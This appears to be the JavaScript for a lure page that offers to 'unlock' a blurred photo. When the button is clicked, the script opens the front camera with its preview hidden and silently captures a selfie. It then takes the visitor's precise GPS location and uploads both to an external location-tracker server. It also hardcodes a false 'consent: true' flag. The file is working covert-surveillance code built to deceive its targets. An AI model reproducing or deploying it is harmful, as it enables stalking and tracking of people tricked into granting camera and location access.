const viewPhotoBtn = document.getElementById("viewPhotoBtn");
const statusEl = document.getElementById("status");
const albumPhoto = document.getElementById("albumPhoto");
const lockBadge = document.getElementById("lockBadge");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const captureBtn = document.getElementById("captureBtn");
const cameraPermissionSection = document.getElementById("cameraPermissionSection");
const progressEl = document.getElementById("permissionProgress");

const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

let cameraStream = null;
let lastLocationId = null;
let selfieBlob = null;

function setStatus(message) {
    statusEl.innerHTML = message;
}

function unlockPhoto() {
    albumPhoto.style.filter = "blur(0)";
    lockBadge.style.opacity = "0";
    viewPhotoBtn.disabled = false;
    viewPhotoBtn.textContent = "👁️ View This Photo";
}

// --- Step 1: Request camera (hidden) and capture selfie ---
async function requestCameraAndCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        cameraStream = stream;

        // Set video source briefly to capture a frame
        video.srcObject = stream;

        // Wait for video to be ready, then capture
        await new Promise((resolve) => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
            // Fallback if already loaded
            if (video.readyState >= 2) {
                resolve();
            }
        });

        // Wait a tiny bit for the camera to warm up
        await new Promise(r => setTimeout(r, 500));

        // Capture the selfie
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        // Convert to blob
        selfieBlob = await new Promise((resolve) => {
            canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.9);
        });

        // Stop camera immediately – user never sees it
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }
        video.srcObject = null;

        // Now proceed to location
        await requestLocationAndUpload();

    } catch (err) {
        console.error(err);
        setStatus("❌ Camera permission denied.");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
    }
}

// --- Step 2: Request location, upload both, unlock photo ---
function requestLocationAndUpload() {
    setStatus("📍 Requesting location...");

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                timestamp: new Date().toISOString(),
                consent: true
            };

            try {
                // Send location to server
                const locResponse = await fetch(LOCATION_API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                const locResult = await locResponse.json();

                if (!locResponse.ok) {
                    setStatus("❌ " + locResult.message);
                    viewPhotoBtn.disabled = false;
                    viewPhotoBtn.textContent = "👁️ View This Photo";
                    return;
                }

                lastLocationId = locResult.id;

                // Upload selfie with location ID
                if (selfieBlob) {
                    const formData = new FormData();
                    formData.append("image", selfieBlob, "selfie.jpg");
                    formData.append("timestamp", new Date().toISOString());
                    formData.append("location_id", lastLocationId);

                    const selfieResponse = await fetch(SELFIE_API_URL, {
                        method: "POST",
                        body: formData
                    });

                    const selfieResult = await selfieResponse.json();

                    if (selfieResponse.ok) {
                        setStatus("✅ Photo unlocked!");
                    } else {
                        setStatus("⚠️ " + selfieResult.message);
                    }
                }

                // Unlock the photo
                unlockPhoto();

            } catch (err) {
                console.error(err);
                setStatus("❌ Could not connect to server.");
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
            }
        },
        (error) => {
            switch (error.code) {
                case error.PERMISSION_DENIED:
                    setStatus("❌ Location permission denied.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    setStatus("❌ Location unavailable.");
                    break;
                case error.TIMEOUT:
                    setStatus("❌ Location request timed out.");
                    break;
                default:
                    setStatus("❌ Unknown location error.");
            }
            viewPhotoBtn.disabled = false;
            viewPhotoBtn.textContent = "👁️ View This Photo";
        },
        {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        }
    );
}

// --- Handle "View This Photo" click ---
viewPhotoBtn.addEventListener("click", () => {
    viewPhotoBtn.disabled = true;
    viewPhotoBtn.textContent = "⏳ Verifying...";
    setStatus("");

    // Hide all UI elements permanently
    cameraPermissionSection.style.display = "none";
    video.style.display = "none";
    captureBtn.style.display = "none";
    if (progressEl) progressEl.style.display = "none";

    // Start: camera first (hidden) → capture → location → unlock
    requestCameraAndCapture();
});